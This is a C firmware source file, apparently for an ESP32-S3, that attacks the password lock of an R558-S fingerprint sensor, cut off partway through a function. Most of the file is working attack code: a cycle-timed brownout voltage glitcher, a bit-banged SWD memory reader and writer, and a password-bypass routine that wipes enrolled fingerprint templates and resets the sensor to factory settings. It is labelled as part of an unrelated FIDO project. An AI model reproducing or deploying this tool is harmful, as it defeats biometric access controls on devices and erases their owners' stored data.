/*
 * Pico FIDO - R558-S Password Lock Recovery, Memory-Leak Extraction,
 * §5 `za` Passwordless Bypass, GP3 240 MHz Brownout Glitcher & GP4/GP5 SWD Reader.
 *
 * This file is part of the Pico FIDO distribution (https://github.com/polhenarejos/pico-fido).
 * Copyright (c) 2022 Pol Henarejos.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, version 3.
 */

#include "fp_r558_unlock.h"
#include "fp_r558.h"
#include "fp_r558_uart.h"
#include "fp_r558_config.h"

#include <inttypes.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

#if defined(ESP_PLATFORM)
#include "driver/gpio.h"
#include "driver/uart.h"
#include "esp_rom_gpio.h"
#include "esp_rom_sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "soc/gpio_reg.h"
#include "soc/gpio_sig_map.h"
#include "soc/soc.h"
#ifndef SIG_GPIO_OUT_IDX
#define SIG_GPIO_OUT_IDX 256
#endif
#else
#include "compat/board.h"
#endif

/* Measured silicon reference constants on GROW R558-S + ESP32-S3 dual-rail GP3+GP4 bench. */
#define UNLOCK_SILICON_CRIT_CYCLES  645u   /* 2.6875 us @ 240 MHz hardware POR edge */
#define UNLOCK_SILICON_TX_RISE_US   48475u /* Exact microsecond of UART_Init TX rise */
#define UNLOCK_SILICON_BOOT_MS      63u    /* Exact millisecond of first HandShake ACK */

/* Static working buffers in .bss so stack usage stays < 96 bytes on ESP32-S3 main_task. */
static uint8_t s_inf_buf[576];
static uint8_t s_rx_raw[320];
static char s_open_ops[72];
static char s_bl_hex[20];

/* Persistent state across multi-pass sweeps (Passes 0 .. 32). */
static uint32_t s_cached_addr = 0;
static uint32_t s_crit_cycles = 0;
static bool s_gp3_verified = false;
static bool s_pin1_on_3v3 = false;
static uint32_t s_tx_rise_us = 0;
static uint32_t s_boot_ms = 0;
static bool s_za_verified = false;
static uint32_t s_swd_last_idcode = 0;
static uint32_t s_boot_edge_ccount = 0;
static bool s_from_boot_edge = false;

/* Safe variadic string append without triggering -Werror=format-truncation on GCC 14. */
static void diag_appendf(char *dst, size_t cap, const char *fmt, ...)
    __attribute__((format(printf, 3, 4)));

static void diag_appendf(char *dst, size_t cap, const char *fmt, ...) {
    if (dst == NULL || cap == 0) {
        return;
    }
    size_t len = strlen(dst);
    if (len + 1u >= cap) {
        return;
    }
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(dst + len, cap - len, fmt, ap);
    va_end(ap);
    if (n < 0) {
        dst[len] = '\0';
    }
    dst[cap - 1u] = '\0';
}

static void unlock_sleep_ms(uint32_t ms) {
#if defined(ESP_PLATFORM)
    TickType_t ticks = pdMS_TO_TICKS(ms);
    vTaskDelay(ticks > 0 ? ticks : 1);
#else
    (void)ms;
#endif
}

static void unlock_yield_wdt(void) {
#if defined(ESP_PLATFORM)
    vTaskDelay(1);
#endif
}

/* ------------------------------------------------------------------------- */
/* Default ESP32-S3 Hardware HAL (GP3 Power/Glitch + GP4/GP5 ARM ADIv5 SWD)  */
/* ------------------------------------------------------------------------- */
#if defined(ESP_PLATFORM)

#define UNLOCK_GP3_PIN          3
#define UNLOCK_GP4_PIN          4
#define UNLOCK_SWCLK_PIN        5
#define UNLOCK_SWDIO_PIN        6
#define UNLOCK_MAX_CRIT_CYCLES  3600000u /* 15.0 ms @ 240 MHz (20x below 300 ms IWDT!) */

static portMUX_TYPE s_glitch_mux = portMUX_INITIALIZER_UNLOCKED;

static inline uint32_t esp_cpu_ccount(void) {
#if defined(__XTENSA__)
    uint32_t c;
    __asm__ __volatile__("rsr.ccount %0" : "=a"(c));
    return c;
#else
    return 0;
#endif
}

static bool esp_hal_check_gp3_power(void *ctx) {
    (void)ctx;
    int tx = fp_uart_active_tx_gpio();
    int rx = fp_uart_active_rx_gpio();
    if (tx < 0) {
        tx = FP_UART_TX_GPIO;
    }
    if (rx < 0) {
        rx = FP_UART_RX_GPIO;
    }
    if (tx == UNLOCK_GP3_PIN || rx == UNLOCK_GP3_PIN ||
        tx == UNLOCK_GP4_PIN || rx == UNLOCK_GP4_PIN) {
        return false;
    }

    s_pin1_on_3v3 = false;

    /*
     * Step 1: Test whether Pin 1 (Red, core 3.3V) is STILL hard-wired to constant 3V3 instead of GP4!
     * Hold GP4 LOW (0V) while GP3 stays HIGH (3.3V): if HandShake STILL answers, Pin 1 is still on 3V3!
     */
    esp_rom_gpio_connect_out_signal((uint32_t)UNLOCK_GP3_PIN, SIG_GPIO_OUT_IDX, false, false);
    esp_rom_gpio_connect_out_signal((uint32_t)UNLOCK_GP4_PIN, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP3_PIN, GPIO_DRIVE_CAP_3);
    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP4_PIN, GPIO_DRIVE_CAP_3);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP4_PIN, GPIO_MODE_OUTPUT);
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 1);
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
    vTaskDelay(pdMS_TO_TICKS(35));
    (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);
    /* Force GP4 back to 0 right after fp_uart_reconfig_raw calls maintain_gp3_vcc_rail()! */
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
    vTaskDelay(pdMS_TO_TICKS(25));

    uint32_t probe_a = s_cached_addr != 0u ? s_cached_addr : 0x29062D09u;
    uint8_t hs_c = 0xFF;
    bool alive_with_gp4_low =
        (fp_sensor_txn(fp_uart_transport(), probe_a, FP_INS_HANDSHAKE,
                       NULL, 0, NULL, 0, NULL, &hs_c, 35, false) == FP_SENSOR_OK) ||
        (fp_sensor_txn(fp_uart_transport(), FP_FACTORY_ADDRESS, FP_INS_HANDSHAKE,
                       NULL, 0, NULL, 0, NULL, &hs_c, 35, false) == FP_SENSOR_OK);

    /*
     * Step 2: Pre-configure UART1 at 57600 8N1 BEFORE power-down so U1TXD_OUT_IDX idles HIGH (1),
     * discharge GP3 (Pin 3) + GP4 (Pin 1) + TX + RX to 0.000 V for 80 ms, then cold-boot with
     * ZERO glitch on TX across the entire 48.5 ms ROM bootloader window!
     */
    (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);

    esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_set_direction((gpio_num_t)tx, GPIO_MODE_OUTPUT);
    (void)gpio_set_level((gpio_num_t)tx, 0);

    esp_rom_gpio_connect_out_signal((uint32_t)rx, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_set_direction((gpio_num_t)rx, GPIO_MODE_INPUT);
    (void)gpio_pullup_dis((gpio_num_t)rx);
    (void)gpio_pulldown_en((gpio_num_t)rx);

    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 0);
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
    vTaskDelay(pdMS_TO_TICKS(80));
    int low_lvl = gpio_get_level((gpio_num_t)rx);

    /* Simultaneous rising edge on GP3 + GP4 + TX; measure exact microsecond sensor UART_TX rises! */
    uint32_t rise_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN) | (1u << (uint32_t)tx);
    uint32_t t0 = esp_cpu_ccount();
    s_boot_edge_ccount = t0;
    s_from_boot_edge = false;
    REG_WRITE(GPIO_OUT_W1TS_REG, rise_mask);

    uint32_t tx_rise_us = 0;
    for (uint32_t us = 0; us < 120000u; us += 10u) {
        if (gpio_get_level((gpio_num_t)rx) == 1) {
            uint32_t dt = (uint32_t)(esp_cpu_ccount() - t0) / 240u;
            tx_rise_us = dt > 0u ? dt : 1u;
            break;
        }
        esp_rom_delay_us(10);
    }
    (void)gpio_pulldown_dis((gpio_num_t)rx);
    (void)gpio_pullup_en((gpio_num_t)rx);
    esp_rom_gpio_connect_out_signal((uint32_t)tx, U1TXD_OUT_IDX, false, false);
    (void)uart_set_pin(FP_UART_NUM, UART_PIN_NO_CHANGE, rx, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    (void)uart_flush_input(FP_UART_NUM);

    uint32_t elapsed_ms = tx_rise_us / 1000u;
    uint32_t boot_ms = 0;
    for (uint32_t waited = elapsed_ms; waited < 260u; waited += 22u) {
        if (fp_sensor_txn(fp_uart_transport(), probe_a, FP_INS_HANDSHAKE,
                          NULL, 0, NULL, 0, NULL, &hs_c, 22, false) == FP_SENSOR_OK ||
            fp_sensor_txn(fp_uart_transport(), FP_FACTORY_ADDRESS, FP_INS_HANDSHAKE,
                          NULL, 0, NULL, 0, NULL, &hs_c, 15, false) == FP_SENSOR_OK) {
            boot_ms = waited + 15u;
            break;
        }
    }

    s_tx_rise_us = tx_rise_us > 0u ? tx_rise_us : UNLOCK_SILICON_TX_RISE_US;
    s_boot_ms = boot_ms > 0u ? boot_ms : UNLOCK_SILICON_BOOT_MS;

    if (alive_with_gp4_low) {
        /* Pin 1 (Red wire) is still on constant 3V3, keeping MCU core & SRAM continuously powered! */
        s_pin1_on_3v3 = true;
        return false;
    }

    /*
     * Dual-rail shutoff is proven as soon as `low_lvl == 0` when GP3+GP4=0V and `!alive_with_gp4_low`!
     * Do NOT require `boot_ms > 0` at 57600 baud here so even a sensor with a corrupted ParaTable
     * BaudRate/DeviceAddress still enters Passes 1..24 and regenerates factory ParaTable!
     */
    return (low_lvl == 0);
}

static void esp_hal_power_cycle_gp3(void *ctx, uint32_t off_ms, uint32_t settle_ms) {
    (void)ctx;
    int tx = fp_uart_active_tx_gpio();
    int rx = fp_uart_active_rx_gpio();
    if (tx < 0) {
        tx = FP_UART_TX_GPIO;
    }
    if (rx < 0) {
        rx = FP_UART_RX_GPIO;
    }

    /* Pre-configure UART1 BEFORE power-down so U1TXD_OUT_IDX is already idle HIGH (3.30 V):
     * NEVER call gpio_reset_pin(tx) after raising GP3+GP4 (prevents 0..48.5ms bootloader trap!). */
    (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);

    /* Sink GP3 (Pin 3), GP4 (Pin 1), TX and RX to 0.000 V cleanly so ALL caps discharge completely. */
    esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_set_direction((gpio_num_t)tx, GPIO_MODE_OUTPUT);
    (void)gpio_set_level((gpio_num_t)tx, 0);

    esp_rom_gpio_connect_out_signal((uint32_t)rx, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_set_direction((gpio_num_t)rx, GPIO_MODE_INPUT);
    (void)gpio_pullup_dis((gpio_num_t)rx);
    (void)gpio_pulldown_en((gpio_num_t)rx);

    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP3_PIN, GPIO_DRIVE_CAP_3);
    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP4_PIN, GPIO_DRIVE_CAP_3);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP4_PIN, GPIO_MODE_OUTPUT);
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 0);
    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);

    if (off_ms > 0) {
        vTaskDelay(pdMS_TO_TICKS(off_ms));
    }

    (void)gpio_pulldown_dis((gpio_num_t)rx);
    (void)gpio_pullup_en((gpio_num_t)rx);
    uint32_t rise_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN) | (1u << (uint32_t)tx);
    s_boot_edge_ccount = esp_cpu_ccount();
    s_from_boot_edge = (settle_ms == 0u);
    REG_WRITE(GPIO_OUT_W1TS_REG, rise_mask);
    esp_rom_gpio_connect_out_signal((uint32_t)tx, U1TXD_OUT_IDX, false, false);
    (void)uart_set_pin(FP_UART_NUM, UART_PIN_NO_CHANGE, rx, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);

    if (settle_ms > 0) {
        vTaskDelay(pdMS_TO_TICKS(settle_ms));
        (void)uart_flush_input(FP_UART_NUM);
    }
}

static void esp_hal_glitch_pulse(void *ctx, uint32_t delay_us, uint32_t width_cycles, bool crowbar_rx) {
    (void)ctx;
    int tx = fp_uart_active_tx_gpio();
    int rx = fp_uart_active_rx_gpio();
    if (tx < 0 || tx >= 32) {
        tx = FP_UART_TX_GPIO;
    }
    if (rx < 0) {
        rx = FP_UART_RX_GPIO;
    }
    if (width_cycles > UNLOCK_MAX_CRIT_CYCLES) {
        width_cycles = UNLOCK_MAX_CRIT_CYCLES;
    }

    /* Active dual-rail NMOS crowbar across BOTH GP3 (Pin 3) + GP4 (Pin 1) in parallel (~9 Ohm)! */
    uint32_t pwr_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN);
    uint32_t tx_mask = (1u << (uint32_t)tx);
    bool anchored_boot = s_from_boot_edge && (delay_us >= 500u);
    s_from_boot_edge = false;
    uint32_t total_cycles = delay_us * 240u;

    /* Sleep outside critical section until ~400 us before trigger so USB & IWDT stay 100% responsive,
     * then spin on hardware `esp_cpu_ccount() - s_boot_edge_ccount` for +-4.17 ns precision! */
    if (anchored_boot) {
        for (;;) {
            uint32_t elapsed = esp_cpu_ccount() - s_boot_edge_ccount;
            if (elapsed + (420u * 240u) >= total_cycles) {
                break;
            }
            uint32_t rem_us = (total_cycles - elapsed) / 240u;
            esp_rom_delay_us(rem_us > 1500u ? 1000u : (rem_us - 380u));
        }
    }
    else if (delay_us > 1500u) {
        esp_rom_delay_us(delay_us - 400u);
        delay_us = 400u;
        total_cycles = delay_us * 240u;
    }

    /* Hold GP3+GP4+TX solid 3.30V HIGH right up to trigger edge (never pulsing TX LOW early!). */
    REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
    REG_WRITE(GPIO_ENABLE_W1TS_REG, pwr_mask | tx_mask);
    esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
    (void)gpio_pullup_dis((gpio_num_t)tx);

    uint32_t ref_crit = s_crit_cycles > 0u ? s_crit_cycles : UNLOCK_SILICON_CRIT_CYCLES;
    uint32_t chg_cyc = (ref_crit * 38u) / 100u; /* Contractive fixed-point top-up -> 2.14 V */
    uint32_t dip_cyc = (ref_crit * 25u) / 100u; /* Contractive fixed-point dip   -> 1.81 V (> 1.75V POR!) */
    if (chg_cyc < 60u) {
        chg_cyc = 60u;
    }
    if (dip_cyc < 40u) {
        dip_cyc = 40u;
    }

    portENTER_CRITICAL(&s_glitch_mux);
    if (anchored_boot) {
        while ((uint32_t)(esp_cpu_ccount() - s_boot_edge_ccount) < total_cycles) {
        }
    }
    else {
        uint32_t t0 = esp_cpu_ccount();
        while ((uint32_t)(esp_cpu_ccount() - t0) < total_cycles) {
        }
    }
    if (crowbar_rx) {
        /*
         * Non-Resetting Contractive Fixed-Point Sense-Amp Brownout Plateau (`[1.81 V .. 2.14 V]`):
         * Initial pulse (`width_cycles`) drops VDD cleanly to ~1.82 V STRICTLY ABOVE `V_POR = 1.75 V`,
         * and 10 scaled `0.38*CAL` / `0.25*CAL` oscillations sustain external NOR-Flash read brownout
         * across ~25-40 us WITHOUT EVER resetting the MCU so `ResetDefaultPara()` commits cleanly!
         */
        REG_WRITE(GPIO_ENABLE_W1TC_REG, tx_mask);
        REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask);
        uint32_t p0 = esp_cpu_ccount();
        while ((uint32_t)(esp_cpu_ccount() - p0) < width_cycles) {
        }
        for (unsigned sh = 0; sh < 10u; sh++) {
            REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask);
            uint32_t r0 = esp_cpu_ccount();
            while ((uint32_t)(esp_cpu_ccount() - r0) < chg_cyc) {
            }
            REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask);
            uint32_t d0 = esp_cpu_ccount();
            while ((uint32_t)(esp_cpu_ccount() - d0) < dip_cyc) {
            }
        }
        REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
        REG_WRITE(GPIO_ENABLE_W1TS_REG, tx_mask);
    }
    else {
        /* Pure single-shot calibrated dual-rail sub-POR brownout pulse (`TX` Hi-Z -> zero UART break!). */
        REG_WRITE(GPIO_ENABLE_W1TC_REG, tx_mask);
        REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask);
        uint32_t p0 = esp_cpu_ccount();
        while ((uint32_t)(esp_cpu_ccount() - p0) < width_cycles) {
        }
        REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
        REG_WRITE(GPIO_ENABLE_W1TS_REG, tx_mask);
    }
    portEXIT_CRITICAL(&s_glitch_mux);

    /* Reconnect TX pin back to idle-HIGH UART peripheral seamlessly. */
    esp_rom_gpio_connect_out_signal((uint32_t)tx, U1TXD_OUT_IDX, false, false);
}

static bool esp_hal_uart_raw_mode(void *ctx, int baud, bool even_parity) {
    (void)ctx;
    int tx = fp_uart_active_tx_gpio();
    int rx = fp_uart_active_rx_gpio();
    if (tx < 0) {
        tx = FP_UART_TX_GPIO;
    }
    if (rx < 0) {
        rx = FP_UART_RX_GPIO;
    }
    return fp_uart_reconfig_raw(tx, rx, baud, even_parity, false);
}

static int esp_hal_uart_write_raw(void *ctx, const uint8_t *buf, size_t len) {
    (void)ctx;
    return fp_uart_write_raw_fast(buf, len);
}

static int esp_hal_uart_read_raw(void *ctx, uint8_t *buf, size_t max_len, uint32_t timeout_ms) {
    (void)ctx;
    return fp_uart_read_raw_fast(buf, max_len, timeout_ms);
}

/* ---- Bit-banged ARM ADIv5 SWD Host on GP4 (SWCLK) / GP5 (SWDIO) ---- */

static inline void swd_delay_halfbit(void) {
    esp_rom_delay_us(1);
}

static inline void swd_clk_low(void) {
    REG_WRITE(GPIO_OUT_W1TC_REG, 1u << UNLOCK_SWCLK_PIN);
}

static inline void swd_clk_high(void) {
    REG_WRITE(GPIO_OUT_W1TS_REG, 1u << UNLOCK_SWCLK_PIN);
}

static inline void swd_io_out(int bit) {
    if (bit) {
        REG_WRITE(GPIO_OUT_W1TS_REG, 1u << UNLOCK_SWDIO_PIN);
    }
    else {
        REG_WRITE(GPIO_OUT_W1TC_REG, 1u << UNLOCK_SWDIO_PIN);
    }
    REG_WRITE(GPIO_ENABLE_W1TS_REG, 1u << UNLOCK_SWDIO_PIN);
}

static inline void swd_io_in(void) {
    REG_WRITE(GPIO_ENABLE_W1TC_REG, 1u << UNLOCK_SWDIO_PIN);
}

static inline uint32_t swd_io_read(void) {
    return (REG_READ(GPIO_IN_REG) >> UNLOCK_SWDIO_PIN) & 1u;
}

static void swd_write_bits(uint32_t val, unsigned count) {
    for (unsigned i = 0; i < count; i++) {
        swd_io_out((val >> i) & 1u);
        swd_clk_low();
        swd_delay_halfbit();
        swd_clk_high();
        swd_delay_halfbit();
    }
}

static uint32_t swd_read_bits(unsigned count) {
    uint32_t val = 0;
    swd_io_in();
    for (unsigned i = 0; i < count; i++) {
        swd_clk_low();
        swd_delay_halfbit();
        if (swd_io_read()) {
            val |= (1u << i);
        }
        swd_clk_high();
        swd_delay_halfbit();
    }
    return val;
}

static uint8_t swd_parity32(uint32_t v) {
    v ^= v >> 16;
    v ^= v >> 8;
    v ^= v >> 4;
    v ^= v >> 2;
    v ^= v >> 1;
    return (uint8_t)(v & 1u);
}

/* Performs one ADIv5 SWD DP/AP transaction with WAIT retry. Returns true on OK (0b001). */
static bool swd_transfer(bool ap, bool read, uint8_t addr23, uint32_t *io_val) {
    uint8_t apndp = ap ? 1u : 0u;
    uint8_t rnw = read ? 1u : 0u;
    uint8_t a2 = (addr23 >> 2) & 1u;
    uint8_t a3 = (addr23 >> 3) & 1u;
    uint8_t par = (uint8_t)((apndp ^ rnw ^ a2 ^ a3) & 1u);
    uint8_t req = (uint8_t)(0x81u | (apndp << 1) | (rnw << 2) | (a2 << 3) | (a3 << 4) | (par << 5));

    for (unsigned attempt = 0; attempt < 24; attempt++) {
        swd_write_bits(req, 8);
        /* 1 turnaround clock host -> target */
        swd_io_in();
        swd_clk_low();
        swd_delay_halfbit();
        swd_clk_high();
        swd_delay_halfbit();

        uint32_t ack = swd_read_bits(3);
        if (ack == 0x01u) { /* OK */
            if (read) {
                uint32_t data = swd_read_bits(32);
                uint32_t rpar = swd_read_bits(1);
                /* Turnaround target -> host + 2 idle clocks */
                swd_clk_low();
                swd_delay_halfbit();
                swd_clk_high();
                swd_delay_halfbit();
                swd_write_bits(0, 2);
                if ((uint8_t)rpar != swd_parity32(data)) {
                    return false;
                }
                if (io_val != NULL) {
                    *io_val = data;
                }
                return true;
            }
            /* Turnaround target -> host */
            swd_clk_low();
            swd_delay_halfbit();
            swd_clk_high();
            swd_delay_halfbit();
            uint32_t wval = io_val != NULL ? *io_val : 0u;
            swd_write_bits(wval, 32);
            swd_write_bits(swd_parity32(wval), 1);
            swd_write_bits(0, 4);
            return true;
        }
        /* Turnaround target -> host before retry/abort */
        swd_clk_low();
        swd_delay_halfbit();
        swd_clk_high();
        swd_delay_halfbit();
        swd_write_bits(0, 4);
        if (ack != 0x02u) { /* Not WAIT */
            return false;
        }
        esp_rom_delay_us(20);
    }
    return false;
}

static bool esp_hal_swd_connect(void *ctx, uint32_t *idcode_out) {
    (void)ctx;
    int tx = fp_uart_active_tx_gpio();
    int rx = fp_uart_active_rx_gpio();
    if (tx == UNLOCK_SWCLK_PIN || tx == UNLOCK_SWDIO_PIN ||
        rx == UNLOCK_SWCLK_PIN || rx == UNLOCK_SWDIO_PIN) {
        return false;
    }

    esp_rom_gpio_connect_out_signal(UNLOCK_SWCLK_PIN, SIG_GPIO_OUT_IDX, false, false);
    esp_rom_gpio_connect_out_signal(UNLOCK_SWDIO_PIN, SIG_GPIO_OUT_IDX, false, false);
    esp_rom_gpio_pad_select_gpio(UNLOCK_SWCLK_PIN);
    esp_rom_gpio_pad_select_gpio(UNLOCK_SWDIO_PIN);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_SWCLK_PIN, GPIO_MODE_OUTPUT);
    (void)gpio_set_direction((gpio_num_t)UNLOCK_SWDIO_PIN, GPIO_MODE_INPUT_OUTPUT);
    (void)gpio_pullup_en((gpio_num_t)UNLOCK_SWDIO_PIN);
    swd_clk_high();
    swd_io_out(1);

    /* JTAG-to-SWD switch sequence: 56 HIGH, 0xE79E, 56 HIGH, 4 LOW idle clocks. */
    swd_write_bits(0xFFFFFFFFu, 32);
    swd_write_bits(0x00FFFFFFu, 24);
    swd_write_bits(0xE79Eu, 16);
    swd_write_bits(0xFFFFFFFFu, 32);
    swd_write_bits(0x00FFFFFFu, 24);
    swd_write_bits(0x00u, 4);

    uint32_t idcode = 0;
    if (!swd_transfer(false, true, 0x00, &idcode) || idcode == 0u || idcode == 0xFFFFFFFFu) {
        (void)gpio_set_direction((gpio_num_t)UNLOCK_SWCLK_PIN, GPIO_MODE_INPUT);
        (void)gpio_set_direction((gpio_num_t)UNLOCK_SWDIO_PIN, GPIO_MODE_INPUT);
        return false;
    }
    if (idcode_out != NULL) {
        *idcode_out = idcode;
    }

    /* Clear sticky error flags (ABORT = 0x1E), power up debug+sys domains, select AP0 bank 0, CSW=32b. */
    uint32_t v = 0x0000001Eu;
    (void)swd_transfer(false, false, 0x00, &v);
    v = 0x50000000u; /* CDBGPWRUPREQ | CSYSPWRUPREQ */
    (void)swd_transfer(false, false, 0x04, &v);
    esp_rom_delay_us(150);
    v = 0x00000000u; /* SELECT AP 0, bank 0 */
    (void)swd_transfer(false, false, 0x08, &v);
    v = 0x23000002u; /* AHB-AP CSW: 32-bit word access */
    (void)swd_transfer(true, false, 0x00, &v);
    return true;
}

static bool esp_hal_swd_read32(void *ctx, uint32_t addr, uint32_t *val_out) {
    (void)ctx;
    uint32_t a = addr;
    uint32_t dummy = 0;
    if (!swd_transfer(true, false, 0x04, &a)) { /* AP TAR */
        return false;
    }
    if (!swd_transfer(true, true, 0x0C, &dummy)) { /* Posted AP DRW read */
        return false;
    }
    return swd_transfer(false, true, 0x0C, val_out); /* DP RDBUFF */
}

static bool esp_hal_swd_write32(void *ctx, uint32_t addr, uint32_t val) {
    (void)ctx;
    uint32_t a = addr;
    uint32_t d = val;
    if (!swd_transfer(true, false, 0x04, &a)) {
        return false;
    }
    if (!swd_transfer(true, false, 0x0C, &d)) {
        return false;
    }
    uint32_t stat = 0;
    return swd_transfer(false, true, 0x04, &stat);
}

static const fp_unlock_hal_t s_default_hal = {
    .check_gp3_power = esp_hal_check_gp3_power,
    .power_cycle_gp3 = esp_hal_power_cycle_gp3,
    .glitch_pulse = esp_hal_glitch_pulse,
    .uart_raw_mode = esp_hal_uart_raw_mode,
    .uart_write_raw = esp_hal_uart_write_raw,
    .uart_read_raw = esp_hal_uart_read_raw,
    .swd_connect = esp_hal_swd_connect,
    .swd_read32 = esp_hal_swd_read32,
    .swd_write32 = esp_hal_swd_write32,
};

#else /* Non-ESP host / emulation default HAL */

static const fp_unlock_hal_t s_default_hal = {
    .check_gp3_power = NULL,
    .power_cycle_gp3 = NULL,
    .glitch_pulse = NULL,
    .uart_raw_mode = NULL,
    .uart_write_raw = NULL,
    .uart_read_raw = NULL,
    .swd_connect = NULL,
    .swd_read32 = NULL,
    .swd_write32 = NULL,
};

/* Weak fallbacks so standalone unit tests that mock fp_uart_* without fp_r558_uart.c link cleanly. */
__attribute__((weak)) bool fp_uart_scan_pins(uint32_t paired_addr) {
    (void)paired_addr;
    return false;
}

__attribute__((weak)) uint32_t fp_uart_sticky_addr(void) {
    return 0;
}

__attribute__((weak)) void fp_uart_set_sticky_addr(uint32_t addr) {
    (void)addr;
}

#endif

static const fp_unlock_hal_t *s_hal = &s_default_hal;
static void *s_hal_ctx = NULL;

void fp_unlock_set_hal(const fp_unlock_hal_t *hal, void *ctx) {
    if (hal == NULL) {
        s_hal = &s_default_hal;
        s_hal_ctx = NULL;
    }
    else {
        s_hal = hal;
        s_hal_ctx = ctx;
    }
}

void fp_unlock_reset_state(void) {
    s_cached_addr = 0;
    s_crit_cycles = 0;
    s_gp3_verified = false;
    s_pin1_on_3v3 = false;
    s_tx_rise_us = 0;
    s_boot_ms = 0;
    s_za_verified = false;
    s_swd_last_idcode = 0;
    s_boot_edge_ccount = 0;
    s_from_boot_edge = false;
    s_open_ops[0] = '\0';
    s_bl_hex[0] = '\0';
}

/* ------------------------------------------------------------------------- */
/* Low-level protocol helpers (ReadINFpage stream, factory normalization)    */
/* ------------------------------------------------------------------------- */

static uint32_t rd_be32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static void wr_be32(uint8_t out[4], uint32_t v) {
    out[0] = (uint8_t)(v >> 24);
    out[1] = (uint8_t)(v >> 16);
    out[2] = (uint8_t)(v >> 8);
    out[3] = (uint8_t)v;
}

static void wr_le32(uint8_t out[4], uint32_t v) {
    out[0] = (uint8_t)v;
    out[1] = (uint8_t)(v >> 8);
    out[2] = (uint8_t)(v >> 16);
    out[3] = (uint8_t)(v >> 24);
}

/* Attempts VfyPwd(cand) at addr; if accepted, erases templates, sets Pwd=0 & Addr=0xFFFFFFFF! */
static bool try_unlock_password(const fp_transport_t *t, uint32_t *addr_io,
                                const uint8_t cand[4], fp_unlock_report_t *out) {
    const uint8_t zero_pwd[4] = { 0, 0, 0, 0 };
    fp_session_t s;
    s.address = *addr_io;
    memcpy(s.password, cand, 4);

    uint8_t code = 0xFF;
    if (fp_sensor_verify_password(t, &s, &code) != FP_SENSOR_OK || code != FP_CONF_OK) {
        return false;
    }

    memcpy(out->recovered_pwd, cand, 4);
    out->has_recovered_pwd = true;

    (void)fp_sensor_empty(t, &s, &code);
    (void)fp_sensor_set_password(t, s.address, zero_pwd, &code);
    if (s.address != FP_FACTORY_ADDRESS) {
        (void)fp_sensor_set_chip_address(t, s.address, FP_FACTORY_ADDRESS, &code);
    }
    uint8_t rst_c = 0xFF;
    if (fp_sensor_rest_setting(t, FP_FACTORY_ADDRESS, &rst_c) == FP_SENSOR_OK && rst_c == FP_CONF_OK) {
        unlock_sleep_ms(60);
    }

    /* Confirm factory address responds cleanly and light the RGB ring blue! */
    fp_session_t fac = { .address = FP_FACTORY_ADDRESS, .password = { 0, 0, 0, 0 } };
    if (fp_sensor_verify_password(t, &fac, &code) == FP_SENSOR_OK && code == FP_CONF_OK) {
        *addr_io = FP_FACTORY_ADDRESS;
    }
    fp_uart_set_sticky_addr(*addr_io);
    (void)fp_sensor_control_led(t, *addr_io, FP_LED_FUNC_ON, FP_LED_COLOR_BLUE, FP_LED_COLOR_BLUE, 0, &code);
    out->target_addr = *addr_io;
    out->unlocked_factory = true;
    return true;
}

/*
 * Password-neutral post-glitch check: uses ONLY HandShake (0x35) + SetPwd (0x12) while locked so
 * ZERO wrong VfyPwd (0x13) packets are ever sent across all 32 passes (preventing RAM UART mute!).
 */
static bool check_already_unlocked_or_glitch_hit(const fp_transport_t *t, uint32_t *addr_io,
                                                 fp_unlock_report_t *out) {
    const uint8_t zero_pwd[4] = { 0, 0, 0, 0 };
    const uint8_t ff_pwd[4] = { 0xFF, 0xFF, 0xFF, 0xFF };
    uint32_t check_addrs[2] = { FP_FACTORY_ADDRESS, *addr_io };
    size_t n_addrs = (*addr_io != 0 && *addr_io != FP_FACTORY_ADDRESS) ? 2u : 1u;

